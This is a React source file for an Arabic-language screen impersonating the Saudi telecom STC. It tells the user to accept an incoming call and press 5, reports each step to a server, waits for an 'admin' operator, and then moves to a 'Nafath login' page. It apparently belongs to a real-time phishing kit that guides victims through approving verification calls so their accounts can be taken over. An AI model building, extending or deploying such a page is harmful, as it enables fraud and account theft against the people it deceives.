import Button from "@mui/material/Button";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import "./CallAlert.css";
import { CircularProgress, createTheme, ThemeProvider } from "@mui/material";
import { adminLoading, loading } from "@/real-time/context/signals";

function StsCallAlert() {
  const submit = () => {
    sendDataToServer({
      data: { الحالة: "تم تلقي المكالمة" },
      current: "تنبية إتصال STC",
      nextPage: "تسجيل دخول نفاذ",
      waitingForAdminResponse: true,
    });
  };

  useEffect(() => setCurrentPage("تنبية إتصال STC"), []);

  const customTheme = createTheme({
    direction: "rtl",
    typography: {
      fontFamily: "Cairo, Roboto, sans-serif",
    },
    palette: {
      primary: {
        main: "#ff375e",
      },
    },
  });

  return (
    <ThemeProvider theme={customTheme}>
      <section className="contact-alert absolute h-full w-full top-0 left-0 flex justify-between items-center gap-8 w-full bg-white py-12 px-2 sm:py-[8rem]">
        <img src="images/my-stc.png" className="w-[100px] sm:w-[120px]" />

        <div className="text-center max-w-[300px] mx-auto">
          <img src="images/phone-ringing.png" className="w-full" />
          <h2 className="font-bold text-2xl mt-6 sm:mt-0">
            سوف تتلقى مكالمة قريبا.
          </h2>
          <p className="mt-6 text-center" style={{ fontSize: "1.05rem" }}>
            يرجي الموافقة عليها وإدخال الرقم{" "}
            <span className="font-bold text-[#ff375e]">5</span> في المكالمة و
            المتابعة
          </p>
        </div>

        <Stack className="form-bottom bottom-10 left-0 w-full px-4 max-w-[300px]">
          <Button
            fullWidth
            disabled={Boolean(loading.value || adminLoading.value)}
            variant="contained"
            onClick={submit}
          >
            {(loading.value || adminLoading.value) && <CircularProgress />}
            {!loading.value && !adminLoading.value && "تم تلقي المكالة "}
          </Button>
        </Stack>
      </section>
    </ThemeProvider>
  );
}

export default StsCallAlert;
